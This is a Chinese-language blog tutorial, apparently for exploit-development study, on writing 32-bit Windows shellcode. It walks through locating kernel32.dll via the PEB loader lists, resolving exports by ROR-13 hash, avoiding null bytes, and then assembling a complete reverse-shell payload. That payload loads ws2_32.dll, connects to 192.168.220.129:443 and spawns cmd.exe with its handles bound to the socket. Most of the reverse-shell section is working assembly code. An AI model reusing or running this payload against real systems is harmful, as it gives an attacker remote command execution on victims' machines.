---
layout: default
---

---
### 查找kernel32.dll基址
> ==通过TEB->PEB->Ldr来获取到kernel32.dll基址.==
1. 通过TEB得到PEB
```
0:000> dt !_teb @$teb
ntdll!_TEB
   +0x000 NtTib            : _NT_TIB
   +0x01c EnvironmentPointer : (null) 
   +0x020 ClientId         : _CLIENT_ID
   +0x028 ActiveRpcHandle  : (null) 
   +0x02c ThreadLocalStoragePointer : 0x00538600 Void
   +0x030 ProcessEnvironmentBlock : 0x0022e000 _PEB
   +0x034 LastErrorValue   : 0
   +0x038 CountOfOwnedCriticalSections : 0
```

2. 通过PEB得到Ldr
```
0:000> dt !_PEB 0x0022e000 
ntdll!_PEB
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0x1 ''
   +0x003 BitField         : 0 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y0
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 IsPackagedProcess : 0y0
   +0x003 IsAppContainer   : 0y0
   +0x003 IsProtectedProcessLight : 0y0
   +0x003 IsLongPathAwareProcess : 0y0
   +0x004 Mutant           : 0xffffffff Void
   +0x008 ImageBaseAddress : 0x00400000 Void
   +0x00c Ldr              : 0x770c6c00 _PEB_LDR_DATA
```

3. Ldr信息
```
0:000> dt !_PEB_LDR_DATA  0x770c6c00 
ntdll!_PEB_LDR_DATA
   +0x000 Length           : 0x30
   +0x004 Initialized      : 0x1 ''
   +0x008 SsHandle         : (null) 
   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x532dd8 - 0x538488 ]              ;按加载顺序显示上一个模块和下一个模块
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x532de0 - 0x538490 ]            ;内存放置顺序显示上一个模块和下一个模块
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x532ce0 - 0x5331b8 ]    ;按初始化顺序显示上一个模块和下一个模块
   +0x024 EntryInProgress  : (null) 
   +0x028 ShutdownInProgress : 0 ''
   +0x02c ShutdownThreadId : (null) 
   
--------------------
0:000> dt !_LIST_ENTRY 0x770c6c00 + 0x1c
ntdll!_LIST_ENTRY
 [ 0x532ce0 - 0x5331b8 ]
   +0x000 Flink            : 0x00532ce0 _LIST_ENTRY [ 0x533508 - 0x770c6c1c ]
   +0x004 Blink            : 0x005331b8 _LIST_ENTRY [ 0x770c6c1c - 0x533508 ]
```
> 补充
```
########################list_entry获取数据位置########################
#define list_entry(ptr, type, member) ((type *) ((char *) (ptr) - (unsigned long) (&((type *) 0)->member)))

ptr 	: 	list_entry节点指针
type 	:	数据类型指针
member	:	这是TYPE对象中list_head型变量的变量名

(TYPE *)0 				:	将0强制转换成TYPE型指针，则该指针一定指向0地址(数据结构基址).
&((TYPE *)0)->MEMBER	:	MEMBER对应数据基址的偏移offset.
然后使用ptr-offset		:	数据真实基址.
```
4. _LDR_DATA_TABLE_ENTRY
```
_LIST_ENTRY中的数据为_LDR_DATA_TABLE_ENTRY.
因为0x532ce0是InInitializationOrderModuleList的地址. InInitializationOrderLinks在_LDR_DATA_TABLE_ENTRY中偏移为0x10,所以地址-0x10.

0:000> dt _LDR_DATA_TABLE_ENTRY 0x532ce0-0x10
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x5331a8 - 0x532dd8 ]
   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x5331b0 - 0x532de0 ]
   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x533508 - 0x770c6c1c ]
   +0x018 DllBase          : 0x76fb0000 Void
   +0x01c EntryPoint       : (null) 
   +0x020 SizeOfImage      : 0x18d000
   +0x024 FullDllName      : _UNICODE_STRING "C:\Windows\SYSTEM32\ntdll.dll"
   +0x02c BaseDllName      : _UNICODE_STRING "ntdll.dll"
   +0x034 FlagGroup        : [4]  "???"
   +0x034 Flags            : 0xa2c4
   +0x034 PackagedBinary   : 0y0
   +0x034 MarkedForRemoval : 0y0
   +0x034 ImageDll         : 0y1

--------------------
ntdll!_UNICODE_STRING
   +0x000 Length           : Uint2B
   +0x002 MaximumLength    : Uint2B
   +0x004 Buffer           : Ptr32 Wchar

所以ntdll!_LDR_DATA_TABLE_ENTRY + 0x2C + 0x04 = BaseDllName
```
5.  查找kernel32.dll基址代码
```
	find_kernel32:
		xor ecx, ecx					;	ECX = 0
		mov esi, fs: [ecx + 30h]		;	ESI = PEB
		mov esi, [esi + 0Ch]			;	ESI = PEB->Ldr
		mov esi, [esi + 1Ch]			;	ESI = PEB->Ldr.InInitOrder

	next_module:
		mov ebx, [esi + 8h]				;	EBX = InInitOrder[X].base_address
		mov edi, [esi + 20h]			;	EDI = InInitOrder[X].module_name
		mov esi, [esi]					;	ESI = InInitOrder[X].flink
		cmp[edi + 12 * 2], cx			;	(UNICODE)module_name[12] == 0x00(kernal32.dll)
		jne next_module
		ret
```

---
### 查找函数
> ==通过PE头查找到导出表,遍历导出表找到想要的函数.==
1. DOS头信息
```
0:000> dt _IMAGE_DOS_HEADER 76a60000 
ntdll!_IMAGE_DOS_HEADER
   +0x000 e_magic          : 0x5a4d
   +0x002 e_cblp           : 0x90
   +0x004 e_cp             : 3
   +0x006 e_crlc           : 0
   +0x008 e_cparhdr        : 4
   +0x00a e_minalloc       : 0
   +0x00c e_maxalloc       : 0xffff
   +0x00e e_ss             : 0
   +0x010 e_sp             : 0xb8
   +0x012 e_csum           : 0
   +0x014 e_ip             : 0
   +0x016 e_cs             : 0
   +0x018 e_lfarlc         : 0x40
   +0x01a e_ovno           : 0
   +0x01c e_res            : [4] 0
   +0x024 e_oemid          : 0
   +0x026 e_oeminfo        : 0
   +0x028 e_res2           : [10] 0
   +0x03c e_lfanew         : 0n256
```
2. PE头信息
```
0:000> dt _IMAGE_NT_HEADERS 76a60000 + 0x100
ntdll!_IMAGE_NT_HEADERS
   +0x000 Signature        : 0x4550
   +0x004 FileHeader       : _IMAGE_FILE_HEADER
   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER
```
3. OptionalHeader
```
0:000> dt _IMAGE_OPTIONAL_HEADER 76a60000 + 0x100 + 0x18
ntdll!_IMAGE_OPTIONAL_HEADER
   +0x000 Magic            : 0x10b
   +0x002 MajorLinkerVersion : 0xe ''
   +0x003 MinorLinkerVersion : 0xa ''
   +0x004 SizeOfCode       : 0x60000
   +0x008 SizeOfInitializedData : 0x2e000
   +0x00c SizeOfUninitializedData : 0
   +0x010 AddressOfEntryPoint : 0x106a0
   +0x014 BaseOfCode       : 0x10000
   +0x018 BaseOfData       : 0x70000
   +0x01c ImageBase        : 0x76a60000
   +0x020 SectionAlignment : 0x10000
   +0x024 FileAlignment    : 0x1000
   +0x028 MajorOperatingSystemVersion : 0xa
   +0x02a MinorOperatingSystemVersion : 0
   +0x02c MajorImageVersion : 0xa
   +0x02e MinorImageVersion : 0
   +0x030 MajorSubsystemVersion : 0xa
   +0x032 MinorSubsystemVersion : 0
   +0x034 Win32VersionValue : 0
   +0x038 SizeOfImage      : 0xd0000
   +0x03c SizeOfHeaders    : 0x1000
   +0x040 CheckSum         : 0x937be
   +0x044 Subsystem        : 3
   +0x046 DllCharacteristics : 0x4140
   +0x048 SizeOfStackReserve : 0x40000
   +0x04c SizeOfStackCommit : 0x1000
   +0x050 SizeOfHeapReserve : 0x100000
   +0x054 SizeOfHeapCommit : 0x1000
   +0x058 LoaderFlags      : 0
   +0x05c NumberOfRvaAndSizes : 0x10
   +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY
```
4. 导出表信息
```
0:000> dt _IMAGE_DATA_DIRECTORY 76a60000 + 0x100 + 0x78
ntdll!_IMAGE_DATA_DIRECTORY
   +0x000 VirtualAddress   : 0x809a0
   +0x004 Size             : 0xd6a0
```
----------------
```
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;                //未使用,总为0
    DWORD   TimeDateStamp;                  //文件生成时间
    WORD    MajorVersion;                   //主版本号,一般为0
    WORD    MinorVersion;                   //次版本号,一般为0
    DWORD   Name;                           //模块名称指针
    DWORD   Base;                           //基数,序数-基=函数地址数组的索引值
    DWORD   NumberOfFunctions;              //导出函数个数
    DWORD   NumberOfNames;                  //导出函数(有名称)个数
    DWORD   AddressOfFunctions;             // RVA from base of image   //EAT 函数地址表数组RVA(数组内容是DWORD,每一项为函数地址)
    DWORD   AddressOfNames;                 // RVA from base of image   //ENT 函数名称表数组RVA(数组内容为DWORD,指向名称地址RVA)
    DWORD   AddressOfNameOrdinals;          // RVA from base of image   //函数序列号数组RVA(数组内容是WORD,每一项为指向EAT数组的索引)
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

有名称函数查找过程:
	AddressOfNames[index] = FuncName             //通过名称在ENT中查找
	AddressOfNameOrdinals[index] = val           //使用ENT相同索引查找函数序列号数组
	AddressOfFunctions[val] = FuncAddress        //用上一步查找的内容做为EAT表的索引进行查找即可查找到函数RVA地址

无名称函数查找过程:
    直接用函数序数-基数=EAT索引,直接用索引查找EAT表即可.
```
5. 导出表函数名需要进行匹配,这里使用一种HASH算法使函数名转换为DWORD.
```
	compute_hash :
		xor eax, eax					; NULL EAX
		cdq								; NULL EDX CDQ（Convert Double to Quad的缩写，将双字数据扩展为四字）把EDX的所有位都设成EAX最高位的值
		cld								; Clear direction 清除方向EFLAGS中的方向位(DF)

	compute_hash_again:
		lodsb							; 把ESI指向的存储单元一个字节读入AL, ESI自动累加
		test al, al						; Check for NULL
		jz compute_hash_finished		; If NULL finish
		ror edx, 0x0d					; ror 向右循环移位,它可以将一个二进制数向右移动指定的位数，并将最高位移出的位存储到最低位
		add edx, eax					; Add the new byte to the accumulator
		jmp compute_hash_again			; Next Iteration

	compute_hash_finished :
```
6. 查找函数代码
```
	find_function:
		pushad                          ; save registers   
		mov eax, [ebx + 0x3c]		    ; offset to PE
		mov edi, [ebx + eax + 0x78]	    ; Export Table Directory RVA
		add edi, ebx				    ; Export Table Directory VMA
		mov ecx, [edi + 0x18]		    ; NumberOfNames
		mov eax, [edi + 0x20]		    ; AddressOfNames RVA
		add eax, ebx				    ; AddressOfNames VMA
		mov[ebp - 4], eax			    ; Save AddressOfNames VMA for later

	find_function_loop:
		jecxz find_function_finished	; jmp to the end if ECX is 0
		dec ecx							; Decrement our names counter
		mov eax, [ebp - 4]				; Restore AddressOfNames VMA
		mov esi, [eax + ecx * 4]		; Get the RVA of the symbol name
		add esi, ebx					; Set ESI to the VMA of the current symbol

	compute_hash:
		;转换函数名为hash值
		
	find_function_compare:
		;判断是否匹配
		
	find_function_address:
	   mov   edx, [edi+0x24]           ; AddressOfNameOrdinals RVA
       add   edx, ebx                  ; AddressOfNameOrdinals VMA
       mov   cx,  [edx+2*ecx]          ; Extrapolate the function's ordinal (WORD)
       mov   edx, [edi+0x1c]           ; AddressOfFunctions RVA
       add   edx, ebx                  ; AddressOfFunctions VMA
       mov   eax, [edx+4*ecx]          ; Get the function RVA
       add   eax, ebx                  ; Get the function VMA
       mov   [esp+0x1c], eax           ; Overwrite stack version of eax from pushad(EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI) (eax = esp+0x1c)
		
	find_function_finish:
		popad;
		ret;
```

---
### 避免0x00
> ==在一些指令中会出现0x00字节,需要处理掉这些字节==
1. 算数运算
```
81ec00020000   sub   esp,200h  ===>  81c4f0fdffff   add   esp,0FFFFFDF0h
```
2. CALL相对地址调用
> ==只要被调用的函数地址小于调用者则会使用负数偏移,大概率不会产生0x00字节==
3. CALL绝对地址调用
> ==动态查找绝对地址保存到寄存器,然后CALL Registers==
```
     find_function_shorten:               
       jmp find_function_shorten_bnc   ;     Short jump
       
     find_function_ret:                   
       pop esi                         ;     从栈地址中POP出shellcode地址
       jmp esi                         ;     跳转到shellcode
       
     find_function_shorten_bnc:              
       call find_function_ret          ;     RSP = 指向下一条指令的地址是真正要执行的shellcode地址
       
     find_function:                     
       ......                          ;     shellcode

```
> 除了上述方式,还有其他方式可以得到绝对地址.比如: fnstenv

---
### Reverse Shell

1. 得到CreateProcessA地址.(用于创建cmd.exe进程)
2. 得到LoadLibraryA地址.(用于加载ws2_32.dll)
3. 加载ws2_32.dll
> LoadLibraryA需要一个String参数. ws2_32.dll = 77 73 32 5f 33 32 2e 64 6c 6c 使用栈传递字符串参数
```
	load_ws2_32:
		xor eax, eax;
		mov ax, 0x6c6c             ; 字符串参数
		push eax                   ;
		push 0x642e3233            ;
		push 0x5f327377            ;
		push esp                   ; esp = ws2_32.dll
		call dword ptr[ebp + 0x14] ; Call LoadLibraryA
```
4. 得到WSAStartup地址
```
	resolve_symbols_ws2_32 :
		mov ebx, eax                ; 保存 ws2_32.dll 基址
		push 0x3bfcedcb             ; WSAStartup hash
		call dword ptr[ebp + 0x04]  ; Call find_function
		mov[ebp + 0x1C], eax        ; 保存 WSAStartup 地址
		
		push 0xadf509d9             ; WSASocketA hash
		call dword ptr[ebp + 0x04]  ; Call find_function
		mov[ebp + 0x20], eax        ; 保存 WSASocketA 地址

		push 0xb32dba0c             ; WSAConnect hash
		call dword ptr[ebp + 0x04]  ; Call find_function
		mov[ebp + 0x24], eax        ; 保存 WSAConnect 地址
```
6. 调用WSAStartup
```
	int WSAStartup(
	  WORD      wVersionRequired,
	  LPWSADATA lpWSAData
	);

	typedef struct WSAData {
	  WORD           wVersion;
	  WORD           wHighVersion;
	  unsigned short iMaxSockets;
	  unsigned short iMaxUdpDg;
	  char           *lpVendorInfo;
	  char           szDescription[WSADESCRIPTION_LEN + 1]; //256 + 1
	  char           szSystemStatus[WSASYS_STATUS_LEN + 1]; //128 OR 140 + 1
	} WSADATA;


	call_wsastartup:
		mov eax, esp;
		mov ecx, 0x590              ; 分配空间大小
		sub eax, ecx                ; 分配lpWSAData保存空间
		push eax                    ; Push lpWSAData
		xor eax, eax                ;  
		mov ax, 0x0202              ; wVersionRequired = 2.2
		push eax                    ; push wVersionRequired
		call dword ptr[ebp + 0x1c]  ; CALL WSAStartup
```
6. 调用WSASocketA
```
	SOCKET WSAAPI WSASocketA(
	  int                 af,               //AF_INET (2)
	  int                 type,             //SOCK_STREAM (1)
	  int                 protocol,         //IPPROTO_TCP (6)
	  LPWSAPROTOCOL_INFOA lpProtocolInfo,   //NULL
	  GROUP               g,                //NULL
	  DWORD               dwFlags           //NULL
	);

	call_wsasocketa:
		xor eax, eax;
		push eax                    ; dwFlags         = NULL
		push eax                    ; g               = NULL
		push eax                    ; lpProtocolInfo  = NULL
		mov al, 0x06                ; protocol        = 0x06
		push eax                    ;
		sub al, 0x05                ; type            = 0x06 - 0x05 = 0x01
		push eax                    ;
		inc eax                     ; af              = 0x01++      = 0x02
		push eax                    ;
		call dword ptr[ebp + 0x20]  ; CALL WSASocketA
```
7. 调用WSAConnect
```
	int WSAAPI WSAConnect(
	  SOCKET         s,             // WSASocketA ret
	  const sockaddr *name,
	  int            namelen,       // sizeof(sockaddr) = 0x10
	  LPWSABUF       lpCallerData,  // NULL
	  LPWSABUF       lpCalleeData,  // NULL
	  LPQOS          lpSQOS,        // NULL
	  LPQOS          lpGQOS         // NULL
	);

	typedef struct sockaddr_in {
	#if ...
	  short          sin_family;
	#else
	  ADDRESS_FAMILY sin_family;
	#endif
	  USHORT         sin_port;        // 443 = 1BB
	  IN_ADDR        sin_addr;
	  CHAR           sin_zero[8];      // 0
	} SOCKADDR_IN, *PSOCKADDR_IN;

	typedef struct in_addr {
	  union {
	    struct {
	      UCHAR s_b1;                  // 192 = C0
	      UCHAR s_b2;                  // 168 = A8
	      UCHAR s_b3;                  // 220 = DC
	      UCHAR s_b4;                  // 129 = 81
	    } S_un_b;
	    struct {
	      USHORT s_w1;
	      USHORT s_w2;
	    } S_un_w;
	    ULONG  S_addr;
	  } S_un;
	} IN_ADDR, *PIN_ADDR, *LPIN_ADDR;


	call_wsaconnect:
		mov esi, eax                    ; socket = WSASocketA ret
		xor eax, eax                    ; NULL EAX, 构建sockaddr_in
		push eax                        ; sin_zero = 0 (8字节)
		push eax                        ;
		push 0x81DCA8C0                 ; sin_addr = 192.168.220.129
		mov ax, 0xbb01                  ; sin_port = 443
		shl eax, 0x10                   ; 左移16位
		add ax, 0x02; add 0x02(AF_INET) ; sin_family = 0x02
		push eax                        ; 
		push esp                        ; sockaddr_in 构建完成
		pop edi                         ; sockaddr_in 地址保存至EDI
		xor eax, eax                    ;
		push eax                        ; lpGQOS        = 0
		push eax                        ; LPSQOS        = 0
		push eax                        ; lpCalleeData  = 0
		push eax                        ; lpCallerData  = 0
		add al, 0x10                    ; namelen       = 0x10
		push eax                        ; push namelen
		push edi                        ; *name         = EDI (sockaddr_in)
		push esi                        ; s             = socket 
		call dword ptr[ebp + 0x24]      ; CALL WSAConnect
```
8. 调用  CreateProcessA
```
	BOOL CreateProcessA(
	  LPCSTR                lpApplicationName,      // cmd.exe
	  LPSTR                 lpCommandLine,          // 
	  LPSECURITY_ATTRIBUTES lpProcessAttributes,    // NULL
	  LPSECURITY_ATTRIBUTES lpThreadAttributes,     // NULL
	  BOOL                  bInheritHandles,        // TRUE
	  DWORD                 dwCreationFlags,        // NULL
	  LPVOID                lpEnvironment,          // NULL
	  LPCSTR                lpCurrentDirectory,     // NULL
	  LPSTARTUPINFOA        lpStartupInfo,
	  LPPROCESS_INFORMATION lpProcessInformation
	);

	typedef struct _STARTUPINFOA {
	  DWORD  cb;                      //sizeof(_STARTUPINFOA)
	  LPSTR  lpReserved;
	  LPSTR  lpDesktop;
	  LPSTR  lpTitle;
	  DWORD  dwX;
	  DWORD  dwY;
	  DWORD  dwXSize;
	  DWORD  dwYSize;
	  DWORD  dwXCountChars;
	  DWORD  dwYCountChars;
	  DWORD  dwFillAttribute;
	  DWORD  dwFlags;                  //STARTF_USESTDHANDLES (0x00000100)
	  WORD   wShowWindow;
	  WORD   cbReserved2;
	  LPBYTE lpReserved2;
	  HANDLE hStdInput;
	  HANDLE hStdOutput;
	  HANDLE hStdError;
	} STARTUPINFOA, *LPSTARTUPINFOA;
	
	typedef struct _PROCESS_INFORMATION {
	  HANDLE hProcess;
	  HANDLE hThread;
	  DWORD  dwProcessId;
	  DWORD  dwThreadId;
	} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
```
8.1 初始化 STARTUPINFOA
```
create_startupinfoa :
		push esi                   ; hStdError  = socket
		push esi                   ; hStdOutput = socket
		push esi                   ; hStdInput  = socket
		xor eax, eax               ;
		push eax                   ; lpReserved2 = 0
		push eax                   ; cbReserved2 & wShowWindow = 0
		mov al, 0x80               ; 使用2个0x80相加来避免0x00
		xor ecx, ecx               ;
		mov cx, 0x80               ;
		add eax, ecx               ; eax = 0x100
		push eax                   ; dwFlags = 0x100
		xor eax, eax               ;
		push eax                   ; dwFillAttribute = 0
		push eax                   ; dwYCountChars   = 0
		push eax                   ; dwXCountChars   = 0
		push eax                   ; dwYSize         = 0
		push eax                   ; dwXSize         = 0
		push eax                   ; dwY             = 0
		push eax                   ; dwX             = 0
		push eax                   ; lpTitle         = 0
		push eax                   ; lpDesktop       = 0
		push eax                   ; lpReserved      = 0
		mov al, 0x44               ;
		push eax                   ; cb              = sizeof(_STARTUPINFOA) = 0x44
		push esp                   ; STARTUPINFOA 
		pop edi                    ; edi = &STARTUPINFOA
```
8.2 初始化cmd.exe字符串
```
	create_cmd_string:
		mov eax, 0xff9a879b ; not 0x00657865 = 0xff9a879b
		neg eax             ; not 0xff9a879b = 0x00657865 规避0x00
		push eax            ; 
		push 0x2e646d63     ; cmd.exe = 63 6d 64 2e 65 78 65
		push esp            ;
		pop ebx             ; ebx = &"cmd.exe"
```
8.3 创建进程
```
	call_createprocess:
		mov eax, esp               ; 
		xor ecx, ecx               ;
		mov cx, 0x390              ;
		sub eax, ecx               ; 为lpProcessInformation创建保存空间
		push eax                   ; lpProcessInformation
		push edi                   ; lpStartupInfo = &STARTUPINFOA
		xor eax, eax               ;
		push eax                   ; lpCurrentDirectory     = 0
		push eax                   ; lpEnvironment          = 0
		push eax                   ; dwCreationFlags        = 0
		inc eax                    ; TRUE
		push eax                   ; bInheritHandles        = TRUE
		dec eax                    ; null eax          
		push eax                   ; lpThreadAttributes     = 0
		push eax                   ; lpProcessAttributes    = 0
		push ebx                   ; lpCommandLine          = &"cmd.exe"
		push eax                   ; lpApplicationName      = 0
		call dword ptr [ebp+0x18]  ; Call CreateProcessA
```
### 完整代码参考: **[资源下载](https://download.csdn.net/download/faint23/89314119)**

